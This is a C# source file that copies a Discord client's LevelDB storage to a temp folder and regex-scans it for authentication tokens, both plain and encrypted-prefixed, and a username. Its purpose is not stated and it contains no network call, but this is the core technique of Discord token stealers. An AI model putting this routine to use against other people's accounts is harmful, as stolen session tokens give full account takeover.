using System.Text;
using System.Text.RegularExpressions;

namespace PSTManager.Dis;

public static partial class LevelDbScanner
{
    [GeneratedRegex(@"[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{4,}\.[A-Za-z0-9_\-]{20,}")]
    private static partial Regex TokenRegex();

    [GeneratedRegex(@"dQw4w9WgXcQ:[A-Za-z0-9+/=]+")]
    private static partial Regex EncryptedTokenRegex();

    [GeneratedRegex(@"""username""\s*:\s*""([^""]+)""")]
    private static partial Regex UsernameRegex();

    public static (string? Token, string? Username) Scan(string dbPath)
    {
        string? token = null;
        string? username = null;

        if (!Directory.Exists(dbPath))
            return (null, null);

        var tempDir = Path.Combine(Path.GetTempPath(), $"discord_leveldb_{Guid.NewGuid():N}");
        try
        {
            CopyDirectory(dbPath, Path.Combine(tempDir, "leveldb"));

            foreach (var file in Directory.GetFiles(Path.Combine(tempDir, "leveldb")))
            {
                var ext = Path.GetExtension(file).ToLowerInvariant();
                if (ext is not (".ldb" or ".log" or ".sst") && !Path.GetFileName(file).StartsWith("LOG"))
                    continue;

                var bytes = File.ReadAllBytes(file);
                var text = Encoding.UTF8.GetString(bytes);

                var encMatch = EncryptedTokenRegex().Match(text);
                if (encMatch.Success && token == null)
                    token = encMatch.Value;

                var plainMatch = TokenRegex().Match(text);
                if (plainMatch.Success && token == null)
                    token = plainMatch.Value;

                var userMatch = UsernameRegex().Match(text);
                if (userMatch.Success && username == null)
                    username = userMatch.Groups[1].Value;
            }
        }
        finally
        {
            try { if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true); } catch { }
        }

        return (token, username);
    }

    private static void CopyDirectory(string source, string dest)
    {
        Directory.CreateDirectory(dest);
        foreach (var file in Directory.GetFiles(source))
            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
        foreach (var dir in Directory.GetDirectories(source))
            CopyDirectory(dir, Path.Combine(dest, Path.GetFileName(dir)));
    }
}
